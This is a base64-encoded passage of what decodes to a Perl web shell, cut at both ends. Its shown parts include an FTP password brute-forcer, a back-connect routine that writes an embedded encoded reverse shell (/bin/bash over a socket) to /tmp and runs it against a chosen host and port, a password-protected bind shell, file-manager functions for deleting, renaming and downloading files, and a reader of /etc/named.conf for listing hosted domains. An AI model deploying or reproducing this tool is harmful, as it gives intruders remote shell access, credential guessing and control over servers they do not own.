Q7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCcnV0ZUZvcmNlcgp7CglteSAkcmVzdWx0PSIiOwoJJFNlcnZlcj0kRU5WeydTRVJWRVJfQUREUid9OwoJaWYoJGlueyd1c2VyJ30gZXEgIiIpCgl7CgkJJHJlc3VsdCAuPSAmQnJ1dGVGb3JjZXJGb3JtOwoJfWVsc2UKCXsKCQl1c2UgTmV0OjpGVFA7IAoJCUB1c2VyPSBzcGxpdCgvXG4vLCAkaW57J3VzZXInfSk7CgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsKCQljaG9tcChAdXNlcik7CgkJY2hvbXAoQHBhc3MpOwoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOwoJCWZvcmVhY2ggJHVzZXJuYW1lIChAdXNlcikKCQl7CgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkKCQkJewoJCQkJZm9yZWFjaCAkcGFzc3dvcmQgKEBwYXNzKQoJCQkJewoJCQkJCSRmdHAgPSBOZXQ6OkZUUC0+bmV3KCRTZXJ2ZXIpIG9yIGRpZSAiQ291bGQgbm90IGNvbm5lY3QgdG8gJFNlcnZlck5hbWVcbiI7IAoJCQkJCWlmKCRmdHAtPmxvZ2luKCIkdXNlcm5hbWUiLCIkcGFzc3dvcmQiKSkKCQkJCQl7CgkJCQkJCSRyZXN1bHQgLj0gIjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSdmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyJz5bK10gZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcjwvYT48YnI+XG4iOwoJCQkJCQkkZnRwLT5xdWl0KCk7CgkJCQkJCWJyZWFrOwoJCQkJCX0KCQkJCQlpZighKCRpbnsnc2xlZXAnfSBlcSAiMCIpKQoJCQkJCXsKCQkJCQkJc2xlZXAoaW50KCRpbnsnc2xlZXAnfSkpOwoJCQkJCX0KCQkJCQkkZnRwLT5xdWl0KCk7CgkJCQl9CgkJCX0KCQl9CgkJJHJlc3VsdCAuPSAiXG48YnI+PT09PT09PT09PT4+Pj4+Pj4+Pj4gRmluaXNoZWQgPDw8PDw8PDw8PD09PT09PT09PT08YnI+XG4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJhY2tjb25uZWN0IEZvcm0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmFja0JpbmRGb3JtCnsKCXJldHVybiA8PEVORDsKCTxicj48YnI+CgoJPHRhYmxlPgoJPHRyPgoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgk8dGQ+QmFja0Nvbm5lY3Q6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+CgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPgoKCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPgoJPC9mb3JtPgoJPC90cj4KCTx0cj4KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQoJPGJyPlsrXSBUcnkgY2hlY2sgeW91ciBQb3J0IHdpdGggPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLyI+aHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvPC9hPgoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT4KCgk8YnI+PGJyPgoJPHRhYmxlPgoJPHRyPgoJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+CgoJPHRkPiBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSIxNDEyIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmknKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPgoKCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4KCTx0ZD48aW5wdXQgbmFtZT0icyIgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPgoJPC9mb3JtPgoJPC90cj4KCTx0cj4KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2h1YyBuYW5nIGNodWEgZGMgdGVzdCEKCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+CgoJPC90cj4KCTwvdGFibGU+PGJyPgpFTkQKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgdXNlIHBlcmwKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmFja0JpbmQKewoJdXNlIE1JTUU6OkJhc2U2NDsKCXVzZSBTb2NrZXQ7CQoJJGJhY2twZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnU1U4Nk9sTnZZMnRsZERzTkNpUlRhR1ZzYkFrOUlDSXZZbWx1TDJKaGMyZ2lPdzBLSkVGU1IwTTlRRUZTUjFZN0RRcDFjMlVnVTI5amEyVjBPdzBLZFhObElFWnBiR1ZJWVc1a2JHVTdEUXB6YjJOclpYUW9VMDlEUzBWVUxDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnWjJWMGNISnZkRzlpZVc1aGJXVW9JblJqY0NJcEtTQnZjaUJrYVdVZ2NISnBiblFnSWxzdFhTQlZibUZpYkdVZ2RHOGdVbVZ6YjJ4MlpTQkliM04wWEc0aU93MEtZMjl1Ym1WamRDaFRUME5MUlZRc0lITnZZMnRoWkdSeVgybHVLQ1JCVWtkV1d6RmRMQ0JwYm1WMFgyRjBiMjRvSkVGU1IxWmJNRjBwS1NrZ2IzSWdaR2xsSUhCeWFXNTBJQ0piTFYwZ1ZXNWhZbXhsSUhSdklFTnZibTVsWTNRZ1NHOXpkRnh1SWpzTkNuQnlhVzUwSUNKRGIyNXVaV04wWldRaElqc05DbE5QUTB0RlZDMCtZWFYwYjJac2RYTm9LQ2s3RFFwdmNHVnVLRk5VUkVsT0xDQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFVDFWVUxDSStKbE5QUTB0RlZDSXBPdzBLYjNCbGJpaFRWRVJGVWxJc0lqNG1VMDlEUzBWVUlpazdEUXB3Y21sdWRDQWlMUzA5UFNCRGIyNXVaV04wWldRZ1FtRmphMlJ2YjNJZ1BUMHRMU0FnWEc1Y2JpSTdEUXB6ZVhOMFpXMG9JblZ1YzJWMElFaEpVMVJHU1V4Rk95QjFibk5sZENCVFFWWkZTRWxUVkNBN1pXTm9ieUFuV3l0ZElGTjVjM1JsYldsdVptODZJQ2M3SUhWdVlXMWxJQzFoTzJWamFHODdaV05vYnlBbld5dGRJRlZ6WlhKcGJtWnZPaUFuT3lCcFpEdGxZMmh2TzJWamFHOGdKMXNyWFNCRWFYSmxZM1J2Y25rNklDYzdJSEIzWkR0bFkyaHZPeUJsWTJodklDZGJLMTBnVTJobGJHdzZJQ2M3SkZOb1pXeHNJaWs3RFFwamJHOXpaU0JUVDBOTFJWUTciOwoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsKCgkkQ2xpZW50QWRkciA9ICRpbnsnY2xpZW50YWRkcid9OwoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOwoJaWYoJENsaWVudFBvcnQgZXEgMCkKCXsKCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsKCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOwoJCWlmKC13ICIvdG1wLyIpCgkJewoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQoJCX1lbHNlCgkJewoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOwoJCX0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsKCQlwcmludCBGSUxFICREYXRhOwoJCWNsb3NlIEZJTEU7CgkJc3lzdGVtKCJwZXJsIGJhY2tjb25uZWN0LnBsICRDbGllbnRBZGRyICRDbGllbnRQb3J0Iik7CgkJdW5saW5rKCRGaWxlKTsKCQlleGl0IDA7Cgl9ZWxzZQoJewoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsKCQlpZigtdyAiL3RtcCIpCgkJewoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQoJCX1lbHNlCgkJewoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOwoJCX0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsKCQlwcmludCBGSUxFICREYXRhOwoJCWNsb3NlIEZJTEU7CgkJc3lzdGVtKCJwZXJsIGJpbmRwb3J0LnBsICRDbGllbnRQb3J0Iik7CgkJdW5saW5rKCRGaWxlKTsKCQlleGl0IDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojICBBcnJheSBMaXN0IERpcmVjdG9yeQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBSbURpcigkKSAKewoJbXkgJGRpciA9IHNoaWZ0OwogICAgaWYob3BlbmRpcihESVIsJGRpcikpCgl7CgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJewoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpCgkJCXsKCQkJCSRmaWxlPSAkZGlyLiRQYXRoU2VwLiRmaWxlOwoJCQkJaWYoLWQgJGZpbGUpCgkJCQl7CgkJCQkJJlJtRGlyKCRmaWxlKTsKCQkJCX0KCQkJCWVsc2UKCQkJCXsKCQkJCQl1bmxpbmsoJGZpbGUpOwoJCQkJfQoJCQl9CgkJfQoJCWNsb3NlZGlyKERJUik7Cgl9CglpZighcm1kaXIoJGRpcikpCgl7CgkJCgl9Cn0Kc3ViIEZpbGVPd25lcigkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWUgJGZpbGUpCgl7CgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07CgkJaWYoJFdpbk5UKQoJCXsKCQkJcmV0dXJuICI/Pz8iOwoJCX0KCQllbHNlCgkJewoJCQkkbmFtZT1nZXRwd3VpZCgkdWlkKTsKCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOwoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsKCQl9Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIFBhcmVudEZvbGRlcigkKQp7CglteSAkcGF0aCA9IHNoaWZ0OwoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOwoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOwoJcmV0dXJuICRwYXRoOwp9CnN1YiBGaWxlUGVybXMoJCkKewoJbXkgJGZpbGUgPSBzaGlmdDsKCW15ICR1ciA9ICItIjsKCW15ICR1dyA9ICItIjsKCWlmKC1lICRmaWxlKQoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9CgkJCWlmKC13ICRmaWxlKXsgJHV3ID0gInciOyB9CgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsKCQl9ZWxzZQoJCXsKCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsKCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsKCQkJcmV0dXJuICRyZXN1bHQ7CgkJfQoJfQoJcmV0dXJuICIwMDAwIjsKfQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWUgJGZpbGUpCgl7CgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOwoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07CgkJJHkgPSAkeSArIDE5MDA7CgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOwoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOwoJCXJldHVybiAkbG10aW1lOwoJfQoJcmV0dXJuICI/Pz8iOwp9CnN1YiBGaWxlU2l6ZSgkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJaWYoLWYgJGZpbGUpCgl7CgkJcmV0dXJuIC1zICRmaWxlOwoJfQoJcmV0dXJuICIwIjsKCn0Kc3ViIFBhcnNlRmlsZVNpemUoJCkKewoJbXkgJHNpemUgPSBzaGlmdDsKCWlmKCRzaXplIDw9IDEwMjQpCgl7CgkJcmV0dXJuICRzaXplLiAiIEIiOwoJfQoJZWxzZQoJewoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgCgkJewoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOwoJCQlyZXR1cm4gJHNpemUuIiBLQiI7CgkJfQoJCWVsc2UgCgkJewoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMmYiLCRzaXplIC8gMTAyNCAvIDEwMjQpOwoJCQlyZXR1cm4gJHNpemUuIiBNQiI7CgkJfQoJfQp9CnN1YiB0cmltKCQpCnsKCW15ICRzdHJpbmcgPSBzaGlmdDsKCSRzdHJpbmcgPX4gcy9eXHMrLy87Cgkkc3RyaW5nID1+IHMvXHMrJC8vOwoJcmV0dXJuICRzdHJpbmc7Cn0Kc3ViIEFkZFNsYXNoZXMoJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZz1+IHMvXFwvXFxcXC9nOwoJcmV0dXJuICRzdHJpbmc7Cn0Kc3ViIExpc3REaXIKewoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsKCSRwYXRoPX4gcy9cXFxcL1xcL2c7CglteSAkcmVzdWx0ID0gIjxmb3JtIG5hbWU9J2YnIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBPcGVuIFNhbnM7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IE9wZW4gU2FuczsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4kZC4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+PGEgaHJlZj0namF2YXNjcmlwdDpyZXR1cm4gZmFsc2U7JyBvbmNsaWNrPVwicmVuYW1lX2Zvcm0oJGksJyRkaXJuYW1lJywnIi4mQWRkU2xhc2hlcygmQWRkU2xhc2hlcygkZCkpLiInKVwiPlJlbmFtZTwvYT4gIHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZGlyOiAkZGlybmFtZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGRpcm5hbWUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQoJCXsKCQkJJHN0eWxlPSAoJHN0eWxlIGVxICJsaW5lIikgPyAibm90bGluZSI6ICJsaW5lIjsKCQkJJGZpbGU9JGY7CgkJCSRmID0gJHBhdGguJGY7CgkJCSR2aWV3ID0gIj9kaXI9Ii4kcGF0aC4iJnZpZXc9Ii4kZjsKCQkJJHJlc3VsdCAuPSAiPHRyIGNsYXNzPSckc3R5bGUnPjx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgT3BlbiBTYW5zOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZQYXJzZUZpbGVTaXplKCZGaWxlU2l6ZSgkZikpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVMYXN0TW9kaWZpZWQoJGYpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+RWRpdDwvYT4gfCA8YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJylcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRmaWxlJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsKCX0KCXJldHVybiAkcmVzdWx0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUcnkgdG8gVmlldyBMaXN0IFVzZXIKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVmlld0RvbWFpblVzZXIKewoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsKCW15IEBjbnpzID0gPGRvbWFpbnM+OwoJY2xvc2UgZDBtYWluczsKCW15ICRzdHlsZT0ibGluZSI7CglteSAkcmVzd